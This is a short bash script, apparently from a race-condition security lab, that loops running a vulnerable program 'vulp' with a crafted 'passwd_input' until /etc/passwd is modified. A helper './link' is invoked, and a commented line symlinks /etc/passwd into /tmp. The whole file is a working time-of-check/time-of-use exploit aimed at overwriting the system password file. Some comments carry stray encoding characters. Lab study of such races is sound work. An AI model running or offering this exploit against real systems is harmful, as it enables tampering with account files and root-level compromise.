#!/bin/bash
echo "script running"
#ln -sf /etc/passwd /tmp/xyz
./link
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ] # Ù Check if /etc/passwd is modified
do
    ./vulp < passwd_input # Ù Run the vulnerable program
    new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
